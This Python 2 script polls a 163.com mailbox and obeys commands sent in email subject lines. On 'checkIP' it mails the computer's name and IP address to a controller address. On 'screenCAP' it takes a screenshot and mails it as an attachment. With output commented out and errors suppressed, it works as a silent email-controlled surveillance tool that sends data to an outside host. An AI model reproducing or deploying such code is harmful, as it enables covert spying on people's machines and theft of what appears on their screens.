#coding:utf-8

__author__ = 'cyankw'
'''
本模块基于GuityCrown 在博客http://blog.csdn.net/ivan_zgj/article/details/51013833中的发布的代码改编而来，感谢原作者
'''

from email.mime.text import MIMEText
from PIL import ImageGrab
import poplib  
import smtplib
import email
import socket
import time
import os.path

class MailManager(object):  
  
    def __init__(self):  
        self.popHost = 'pop3.163.com'  
        self.smtpHost = 'smtp.163.com'  
        self.port = 25  
        self.userName = '--------@---.com'  
        self.passWord = '--------'  
        self.bossMail = '--------@---.com'
        self.login()  
        self.configMailBox()
        self.result = {}
        self.pic_need = False
        self.filename = 'd://00.jpg'

  
    # 登录邮箱  
    def login(self):  
        try:  
            self.mailLink = poplib.POP3_SSL(self.popHost)  
            self.mailLink.set_debuglevel(0)  
            self.mailLink.user(self.userName)  
            self.mailLink.pass_(self.passWord)  
            self.mailLink.list()  
            #print u'login'
        except Exception as e:  
            #print u'login fail! ' + str(e)
            quit()  
  
    # 获取邮件  
    def retrMail(self):  
        try:  
            mail_list = self.mailLink.list()[1]
            if len(mail_list) == 0:  
                return None  
            mail_info = mail_list[-1].split(' ')  #mail_list[x]  x=-1为最新一封邮件
            number = mail_info[0]  
            mail = self.mailLink.retr(number)[1]
            self.mailLink.dele(number) #删除当前邮件
            #author log: above function, which had been tested for 49 times, before I understand it and finish edit.
            subject = u''  
            sender = u''
            PCname = ''
            PCip =''
            pic_exist = False
            for i in range(0, len(mail)):  
                if mail[i].startswith('Subject'):  
                    subject = mail[i][9:]
                    #print subject
                    if subject[0:2]=='=?':
                        if subject[2:5] == 'GBK':
                            de_subject = email.Header.decode_header(subject)
                            subject= str(de_subject[0][0])
                            #print subject.decode('GBK')
                        elif subject[2:5]=='UTF':
                            de_subject = email.Header.decode_header(subject)
                            subject = str(de_subject[0][0])
                            #print subject.decode('utf-8')
            # FUNCTION - IP capture
                    if subject == 'checkIP':
                        PCname = socket.getfqdn(socket.gethostname())
                        PCip = socket.gethostbyname(PCname)
                        #print PCname
                        #print PCip
            # FUNCTION - ScreenShot capture
                    if subject == 'screenCAP':
                        pic = ImageGrab.grab()
                        pic.save('d://00.jpg', 'jpeg')
                        pic_exist = True
                if mail[i].startswith('X-Sender'):  
                    sender = mail[i][10:]  
            if PCname != '' or PCip != '':
                content = {'subject': subject, 'sender': sender, 'pc_name': PCname, 'pc_ip': PCip}
                self.result.update(content)
                return content
            elif pic_exist != False:
                self.pic_need = True
                return None
            else:
                content = {'subject': subject, 'sender': sender}
                self.result.update(content)
                return content
            
        except Exception as e:  
            #print u'retrMail() ERROR' + str(e)
            return None  
  
    def configMailBox(self):  
        try:  
            self.mail_box = smtplib.SMTP(self.smtpHost, self.port)  
            self.mail_box.login(self.userName, self.passWord)  
            #print u'config'
        except Exception as e:  
            #print u'config mailbox fail! ' + str(e)
            quit()  
  
    # 发送邮件  
    def sendMsg(self):
        try:
            result = str(self.result)
            msg = MIMEText(result, 'plain', 'utf-8')
            msg['Subject'] = result
            msg['from'] = self.userName  
            self.mail_box.sendmail(self.userName, self.bossMail, msg.as_string())  
            #print u'send MSG success!'
        except Exception as e:
            pass
            #print u'send MSG fail! ' + str(e)

    def sendPic(self):
        try:
            main_msg = email.MIMEMultipart.MIMEMultipart()

            # 构造MIMEText对象做为邮件显示内容并附加到根容器
            text_msg = email.MIMEText.MIMEText("screen capture result is in attach file", _charset="utf-8")
            main_msg.attach(text_msg)

            # 构造MIMEBase对象做为文件附件内容并附加到根容器
            contype = 'application/octet-stream'
            maintype, subtype = contype.split('/', 1)

            ## 读入文件内容并格式化 [方式2]－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
            data = open(self.filename, 'rb')
            file_msg = email.MIMEBase.MIMEBase(maintype, subtype)
            file_msg.set_payload(data.read())
            data.close()
            email.Encoders.encode_base64(file_msg)  # 把附件编码
            # －－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
            ## 设置附件头
            basename = os.path.basename(self.filename)
            file_msg.add_header('Content-Disposition', 'attachment', filename=basename)  # 修改邮件头
            main_msg.attach(file_msg)

            # 设置根容器属性
            main_msg['From'] = self.userName
            main_msg['To'] = self.bossMail
            main_msg['Subject'] = "ScreenCAPTURE"
            main_msg['Date'] = email.Utils.formatdate()

            # 用smtp发送邮件
            self.mail_box.sendmail(self.userName, self.bossMail, main_msg.as_string())
            #print u'send PIC success!'
        except Exception as e:
            #print u'send PIC fail! ' + str(e)
            pass



if __name__ == '__main__':
    while 1:
        mailManager = MailManager()
        mail = mailManager.retrMail()
        if mail != None:
            #print mail
            mailManager.sendMsg()
        elif mailManager.pic_need != False:
            #print mail
            mailManager.sendPic()
        else:
            #print 'no email had been sent'
            pass
        time.sleep(5)
